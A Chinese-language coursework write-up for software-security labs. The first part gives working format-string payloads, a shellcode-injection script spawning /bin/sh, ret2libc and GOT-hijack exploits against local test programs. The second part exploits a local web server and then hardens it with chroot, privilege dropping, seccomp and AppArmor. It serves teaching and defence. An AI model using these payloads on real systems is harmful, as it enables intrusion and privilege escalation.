## 实验 1
### 任务 1：针对 prog1，完成以下任务
关闭 ASLR
```bash
sudo sysctl -w kernel.randomize_va_space=0
```

- 改变程序的内存数据：将变量 var 的值，从 0x11223344 变成 0x66887799
先输入 *AAAA %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x*，找到具体位置（出现 41414141 的地方），之前测试时出现在了第六个位置

```bash
echo $(printf "\x56\xed\xff\xbf@@@@\x54\xed\xff\xbf")%.8x%.8x%.8x%.8x%.26204x%hn%.4369x%hn > input1_1

prog1 < input1_1 | grep -a address
```
- 改变程序的内存数据：将变量 var 的值，从 0x11223344 变成 0xdeadbeef
```bash
echo $(printf "\x56\xed\xff\xbf@@@@\x54\xed\xff\xbf")%.8x%.8x%.8x%.8x%.56961x%hn%.57410x%hn > input1_2

prog1 < input1_2 | grep -a address
```

### 任务 2：针对 prog2，完成以下任务
- 开启 Stack Guard 保护，并关闭栈不可执行保护，通过 shellcode 注入进行利用，获得 shell
```bash
gcc -fstack-protector -z execstack -o prog2_1 prog2.c
```

先输入一下内容，确定具体位置
测试时 ebp = 0xbfffecc8，array_address = 0xbfffece4
```bash
# 0xbfffeccc = 0xbfffecc8 + 0x4
echo $(printf "\xee\xec\xff\xbf@@@@\xec\xec\xff\xbf")%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x > input

echo $(printf "\xbe\xec\xff\xbf@@@@\xbc\xec\xff\xbf")%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x:%.8x > input
```

```python
#!/usr/bin/python3
import sys

# This shellcode creates a local shell
local_shellcode = (
    "\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"
    "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50"
    "\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00"
).encode('latin-1')


N = 200
# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Put the code at the end
start = N - len(local_shellcode)
content[start:] = local_shellcode


# Put the address at the beginning
# ebp 的位置为 0xbfffecc8，则 return 的地址为 0xbfffeccc
addr1 = 0xbfffecce
addr2 = 0xbfffeccc
content[0:4] = (addr1).to_bytes(4, byteorder='little')
content[4:8] = ("@@@@").encode('latin-1')
content[8:12] = (addr2).to_bytes(4, byteorder='little')

# Construct the format string
# 假设地址为数组起始地址 0xbfffece4 + 0x90 = 0xbfffed74
shellcode_address = 0xbfffed74

small = 0xbfff - 12 - 15*8
large = 0xed74 - 0xbfff
s = "%.8x"*15 + "%." + str(small) + "x" + "%hn" + \
    "%." + str(large) + "x" + "%hn"
fmt = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

# Write the content to badfile
file = open("badfile", "wb")
file.write(content)
file.close()
```

- 开启 Stack Guard 保护，并开启栈不可执行保护，通过 ret2lib 进行利用，获得 shell（可以通过调用 system(“/bin/sh”)）

先查看引用的 libc，然后查看 system() 和 "/bin/sh" 的偏移
```bash
ldd prog2_2
# 测试时为 0xb7d8e000

readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system 
# 记录下 system() 的偏移（测试时为 0x0003ada0）

strings -tx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
# 记录下 "/bin/sh" 的偏移（测试时为 0x0015b82b）
```

使用 gdb 查看 libc 加载后的实际地址
```bash
gdb prog2_2
b main
run
info proc mappings
# 测试时的地址为 0xb7d6a000
```

根据以上结果算出对应地址，测试时的计算结果如下：
- system(): 0xb7d6a000 + 0x0003ada0 = 0xb7da4da0
- "/bin/sh": 0xb7d6a000+0x0015b82b=0xb7ec582b

ret (ebp + 4) 填充为 system 的地址，参数字符串 (ebp + 12) 填充为 "/bin/sh" 的地址

```bash
gcc -fstack-protector -z noexecstack -o prog2_2 prog2.c

echo $(printf "\xcc\xec\xff\xbf@@@@\xd4\xec\xff\xbf@@@@\xce\xec\xff\xbf@@@@\xd6\xec\xff\xbf")%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%19724x%hn%2699x%hn%24495x%hn%18x%hn > input

echo $(printf "\xbc\xec\xff\xbf@@@@\xc4\xec\xff\xbf@@@@\xbe\xec\xff\xbf@@@@\xc6\xec\xff\xbf")%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%19724x%hn%2699x%hn%24495x%hn%18x%hn > input
```

### 任务 3：针对 prog2，完成以下任务
- 开启 Stack Guard 保护，并开启栈不可执行保护，通过 GOT 表劫持，调用 win 函数
获取 printf 的 GOT 地址，以及 win 的地址
```bash
objdump -R prog2_2 | grep printf
# 测试时为 0x0804a00c

nm prog2_2 | grep win
# 测试时为 0x0804850b
```

用 win 的地址覆盖 printf 的 GOT 地址
```bash
gcc -fstack-protector -z noexecstack -o prog2_2 prog2.c

echo $(printf "\x0e\xa0\x04\x08@@@@\x0c\xa0\x04\x08")%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%1920x%hn%32007x%hn > input
```

## 实验 2
### 任务 1：针对 ping (/bin/ping) 程序，使用 apparmor 进行访问控制，生成 profile；尝试修改 profile，使得 ping 程序的功能无法完成
```bash
sudo aa-genprof /bin/ping
# 生成 ping 的 profile

sudo vim /etc/apparmor.d/bin.ping
# 在 network 有关的前面加上 deny

sudo apparmor_parser -r /etc/apparmor.d/bin.ping
# 重新加载 profile



sudo apparmor_parser -R /etc/apparmor.d/bin.ping
sudo rm /etc/apparmor.d/bin.ping
# 恢复 ping 的权限

```

### 任务 2-1：chroot
- 为 touchstone 程序添加 setuid root 权限，并启动执行
添加权限
```bash
sudo sysctl -w kernel.randomize_va_space=0

sudo chown root touchstone
sudo chmod +s touchstone
./touchstone
```
输入 127.0.0.1:80 登录 web server
设置 /tmp/test.txt 的 owner 为 root
```bash
sudo chown root /tmp/test.txt

ldd banksv
# 获取 libc.so.6 的地址（测试时为 0xb7dbb000）
# 0xb7d99000
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system"
# 0x0003d3d0
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "exit"
# 0x000305a0
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "unlink"
# 0x000e8f30
strings -tx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
# 0x0017e1db
# 获取 system, exit, unlink, "/bin/sh" 的偏移

# 测试时 ebp = 0xbffff208
```
修改 exploit.py，然后运行以下代码
```bash
sudo ./touchstone
# 然后在网页上登录
python3 exploit.py 127.0.0.1 80
# 随后发现 test.txt 被删除
```

- 修改 server.c，增加 chroot 支持，并重新 make；同时，使用代码目录中的 chroot-setup.sh，改变 root directory 从/ 到 /jail，并在 jail 中启动 server
在 server.c 中进行修改，并重新 make，执行 touchstone，然后执行脚本
```C
//code here...
int rs = chroot("/jail");
if(!rs) printf("Succeeded to chroot to /jail\n");
```
添加可执行权限
```bash
chmod +x chroot-setup.sh chroot-copy.sh
sudo ./chroot-setup.sh
```

获取新的地址（测试时为 0xb7dd0000），然后修改 exploit.py 里的 base address。运行代码获取 ebp_addr，然后重新运行 touchstone、登录用户，再执行 exploit.py 即可
```bash
ps -ef | grep banksv
# 前面的一个数字是 pid
# 获得 banksv 的 pid
# 0xb7dd0000

sudo gdb
attach {pid}
info proc mappings

python3 exploit_1_2.py 127.0.0.1 80

python3 exploit_3_1.py 127.0.0.1 80
python3 exploit_3_2.py 127.0.0.1 80
```

### 任务 2-2：改变进程 euid
打开 server.c，插入 setuid 的代码（共三处）
```C
setresuid(1000,1000,1000);
```
后续重新修改地址（和 2-1 的一样），再检查 /tmp/test.txt 有没有被删除（显然没有）
```bash
python3 exploit_2.py 127.0.0.1 80
```

### 任务 2-3：seccomp
- 默认允许，显式拒绝 (删除失败)
修改 Makefile，添加 -lseccomp 编译选项
```Makefile
all:
        gcc -m32 -no-pie -g -o touchstone server.c
        gcc -m32 -no-pie -fno-stack-protector -g -o filesv ./sql_lite3/sqlite3.o -l pthread -l dl ./sql_lite3/sqlhelper.c filesv.c token.c parse.c http-tree.c handle.c
        gcc -m32 -no-pie -fno-stack-protector -g -o banksv ./sql_lite3/sqlite3.o -l pthread -l dl ./sql_lite3/sqlhelper.c banksv.c  token.c parse.c http-tree.c handle.c -lseccomp
        gcc -m32 -no-pie -fno-stack-protector -g -o httpd  httpd.c token.c parse.c http-tree.c 


clean:
        rm -rf touchstone filesv banksv httpd
```
修改 banksv.c
```C
#include <seccomp.h>

int main (int argc, char **argv)
{
  scmp_filter_ctx ctx;
  int rc;


  ctx = seccomp_init(SCMP_ACT_ALLOW); 
  rc = seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(unlink), 0); // 显式拒绝 unlink
  seccomp_load(ctx);
  seccomp_release(ctx);

  // 后面保留原 main 内容
  Http_t tree;

  if (argc<2)
    die ("server bug");

  signal(SIGCHLD, SIG_IGN);
  ...

```
再重复任务 2-1

- 默认拒绝，显式允许（删除成功）
修改 Makefile，添加 -lseccomp 编译选项
```Makefile
all:
        gcc -m32 -no-pie -g -o touchstone server.c -lseccomp
        gcc -m32 -no-pie -fno-stack-protector -g -o filesv ./sql_lite3/sqlite3.o -l pthread -l dl ./sql_lite3/sqlhelper.c filesv.c token.c parse.c http-tree.c handle.c
        gcc -m32 -no-pie -fno-stack-protector -g -o banksv ./sql_lite3/sqlite3.o -l pthread -l dl ./sql_lite3/sqlhelper.c banksv.c  token.c parse.c http-tree.c handle.c -lseccomp
        gcc -m32 -no-pie -fno-stack-protector -g -o httpd  httpd.c token.c parse.c http-tree.c 


clean:
        rm -rf touchstone filesv banksv httpd
```
修改 banksv.c
```C
#include <seccomp.h>

int main (int argc, char **argv)
{
  scmp_filter_ctx ctx;
  int rc;

  ctx = seccomp_init(SCMP_ACT_KILL);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigaction), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(socketcall), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(clone), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(set_robust_list), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getresuid32), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getcwd), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getpid), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(statx), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(_llseek), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fcntl64), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(access), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fstat64), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(stat64), 0);
  
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(unlink), 0);
  
  seccomp_load(ctx);
  seccomp_release(ctx);

  // 后面保留原 main 内容
  Http_t tree;

  if (argc<2)
    die ("server bug");

  signal(SIGCHLD, SIG_IGN);
  ...

```
再重复任务 2-1

### 任务 2-4：AppArmor
两个终端，一个执行 `sudo aa-genprof banksv`，另一个执行 `sudo ./touchstone`
生成的配置文件位于 /etc/apparmor.d/home.lab2.Desktop.lab2.lab2.code.banksv
```bash
sudo vim /etc/apparmor.d/home.lab2.Desktop.lab2.lab2.code.banksv

sudo apparmor_parser -r /etc/apparmor.d/home.lab2.Desktop.lab2.lab2.code.banksv
# 重新加载 



sudo apparmor_parser -R /etc/apparmor.d/home.lab2.Desktop.lab2.lab2.code.banksv
sudo rm /etc/apparmor.d/home.lab2.Desktop.lab2.lab2.code.banksv
# 恢复 
```

修改 /etc/apparmor.d/home.lab2.Desktop.lab2.lab2.code.banksv 为
```
#include <tunables/global>

/home/lab2/Desktop/lab2/lab2/code/banksv {
  #include <abstractions/apache2-common>
  #include <abstractions/base>

  /home/*/Desktop/lab2/lab2/code/db/users.db rwk,
  /home/*/Desktop/lab2/lab2/code/index.html r,
  /home/*/Desktop/lab2/lab2/code/banksv mr,
  owner /home/*/Desktop/lab2/lab2/code/db/user.db-journal w,

}

```
只能对指定路径的 users.db 文件进行操作，不可操作其它文件
不能新建或修改网页，只能查看
不可更改、删除自身文件，只能装载和读取
仅限 owner 写入，不能被其他用户和 root 修改。且不可读、不可锁定、不可删除